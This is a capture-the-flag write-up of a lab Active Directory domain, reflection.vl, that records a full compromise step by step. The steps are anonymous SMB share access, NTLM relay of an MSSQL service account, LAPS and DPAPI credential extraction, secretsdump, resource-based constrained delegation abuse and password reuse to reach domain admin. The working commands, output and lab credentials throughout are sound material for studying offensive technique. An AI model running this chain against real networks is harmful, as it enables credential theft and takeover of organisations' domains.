# Reflection
![](images/reflection.png)


IPs: `10.10.177.149` `10.10.177.150` `10.10.177.151`

# Recon
Nmap: 

10.10.177.149 dc01.reflection.vl
```
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-10 09:46:33Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

10.10.177.150 ms01.reflection.vl
```
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

10.10.177.151 ws01.reflection.vl
```
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

smb:
Anonymous bind
```
nxc smb 10.10.177.149-199 -u 'anonymous' -p 'anonymous' --shares
SMB         10.10.177.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.177.151   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.177.150   445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.177.149   445    DC01             [-] reflection.vl\anonymous:anonymous STATUS_LOGON_FAILURE 
SMB         10.10.177.151   445    WS01             [-] reflection.vl\anonymous:anonymous STATUS_LOGON_FAILURE 
SMB         10.10.177.150   445    MS01             [+] reflection.vl\anonymous:anonymous 
SMB         10.10.177.150   445    MS01             [*] Enumerated shares
SMB         10.10.177.150   445    MS01             Share           Permissions     Remark
SMB         10.10.177.150   445    MS01             -----           -----------     ------
SMB         10.10.177.150   445    MS01             ADMIN$                          Remote Admin
SMB         10.10.177.150   445    MS01             C$                              Default share
SMB         10.10.177.150   445    MS01             IPC$            READ            Remote IPC
SMB         10.10.177.150   445    MS01             staging         READ            staging environment
```

checking the staging share, there are creds for the mssql db:
```
user=web_staging
password=Washroom510
db=staging
```

Logging in with the user, we dont have the ability to impersonate or xp_cmdshell, as smb signing is disabled we should be able to relay to places.

Running `xpdir_tree` in mssqlclient and then catching it in responder shows 2 things:
```
[SMB] NTLMv2-SSP Client   : 10.10.177.150
[SMB] NTLMv2-SSP Username : REFLECTION\svc_web_staging
[SMB] NTLMv2-SSP Hash     : svc_web_staging::REFLECTION:15f0593c1d3e15a3:E20865924AA729B060D953D096E61414:010100000000000080AF91C3501BDB01E2999F166B10C13400000000020008004800420038004C0001001E00570049004E002D00360053004C003100470034004B00540057004600500004003400570049004E002D00360053004C003100470034004B0054005700460050002E004800420038004C002E004C004F00430041004C00030014004800420038004C002E004C004F00430041004C00050014004800420038004C002E004C004F00430041004C000700080080AF91C3501BDB0106000400020000000800300030000000000000000000000000300000165D8EFF0AF926E7CD16AE28D1A3FF0664104D936B01545B71C8363950E6B40C0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E0038002E0030002E003100310030000000000000000000
```

# SMB Relay
The mssql server is running as a domain user, and its a ntlmv2 hash. We can relay this to smb on the other boxes using ntlmrelayx:
```
$ ntlmrelayx.py -t ws01 -smb2support -i
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
... snip ...
[*] Protocol Client SMB loaded..
```

Then when running `xp_dirtree` again we get a smb shell on a local port:
```
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.177.150, attacking target smb://ws01
[*] Authenticating against smb://ws01 as REFLECTION/SVC_WEB_STAGING SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
```

There was nothing on the ws01, doing the same thing for dc01.
```
# shares
ADMIN$
C$
IPC$
NETLOGON
prod
SYSVOL
# use prod
# ls
drw-rw-rw-          0  Thu Jun  8 03:44:26 2023 .
drw-rw-rw-          0  Thu Jun  8 03:43:22 2023 ..
-rw-rw-rw-         45  Thu Jun  8 21:24:39 2023 prod_db.conf
# get prod_db.conf
```

Again providing more creds:
```
user=web_prod
password=Tribesman201
db=prod
```

Logging into the db on the domain controller gives us domain creds!
```
SQL (web_prod  dbo@prod)> select * from users;
id   name              password            
--   ---------------   -----------------   
 1   b'abbie.smith'    b'CMe1x+nlRaaWEw'   
 2   b'dorothy.rose'   b'hC_fny3OK9glSJ'
```

# Bloodhound analysis
Now with domain creds, we can finally run bloodhound:
```
./bloodhound.py -d reflection.vl -u abbie.smith -p CMe1x+nlRaaWEw -c all -ns 10.10.177.149 --zip -dc dc01.reflection.vl
```

The abbie smith user has generic all over the ms01 box, which also has LAPS. With this we can get admin on the machine.

```
nxc ldap dc01 -u abbie.smith -p CMe1x+nlRaaWEw -M laps
SMB         10.10.177.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
LDAP        10.10.177.149   389    DC01             [+] reflection.vl\abbie.smith:CMe1x+nlRaaWEw 
LAPS        10.10.177.149   389    DC01             [*] Getting LAPS Passwords
LAPS        10.10.177.149   389    DC01             Computer:MS01$ User:                Password:H447.++h6g5}xi
```

The georgia.price user has generic all over ws01, if we get access to this user account we can configure rbcd and login as admin.

dom_rgarner is also a domain admin.

# MS01 to WS01 lateral movement

running secretsdump with the laps account shows
```
secretsdump.py administrator@ms01
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf0093534e5f21601f5f509571855eeee
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
REFLECTION\MS01$:aad3b435b51404eeaad3b435b51404ee:52fe679e706ae506edb8d19608e967f0:::
REFLECTION.VL/Georgia.Price:$DCC2$10240#Georgia.Price#f20a83b9452ce1c17cf4a57c2b05f7ec: (2024-10-13 07:15:59)
REFLECTION\svc_web_staging:DivinelyPacifism98
```
Cached credentials for georgia.price and cleartext pwd for the web service account.

I'm going to upload and run sharpdpapi to see if the credentials are stored within dpapi on the machine.
```
*Evil-WinRM* PS C:\Windows\Tasks> .\SharpDPAPI.exe machinetriage
UserName         : REFLECTION\Georgia.Price 
Credential       : DBl+5MPkpJg5id 
```

nice! now for rbcd:
```
pypykatz crypto nt DBl+5MPkpJg5id
cecba8eb22763fef03c86a53fa4a09e2

rbcd.py reflection.vl/Georgia.Price -hashes :cecba8eb22763fef03c86a53fa4a09e2 -delegate-to ws01\$ -delegate-from ms01\$ -action write 
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ms01$ can now impersonate users on ws01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     MS01$        (S-1-5-21-3375389138-1770791787-1490854311-1104)


getST.py -spn 'cifs/ws01' -impersonate administrator -dc-ip dc01.reflection.vl -hashes :52fe679e706ae506edb8d19608e967f0 reflection.vl/'ms01$'
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_ws01@REFLECTION.VL.ccache
```


# Domain Admin

Going to secrets dump the ws01 box with the hopes of finding more cached credentials:
```
KRB5CCNAME=$(pwd)/administrator\@cifs_ws01\@REFLECTION.VL.ccache secretsdump.py administrator@ws01 -k -no-pass

REFLECTION.VL/Rhys.Garner:$DCC2$10240#Rhys.Garner#99152b74dac4cc4b9763240eaa4c0e3d: (2023-06-08 11:17:05)
[*] DefaultPassword 
reflection.vl\Rhys.Garner:knh1gJ8Xmeq+uP

```

This account looks like the low priv version of the domain admins account. Let's hope for pwd reuse:
```
nxc ldap dc01 -u dom_rgarner -p knh1gJ8Xmeq+uP
SMB         10.10.146.181   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
LDAP        10.10.146.181   389    DC01             [+] reflection.vl\dom_rgarner:knh1gJ8Xmeq+uP (Pwn3d!)
```

TaDa!
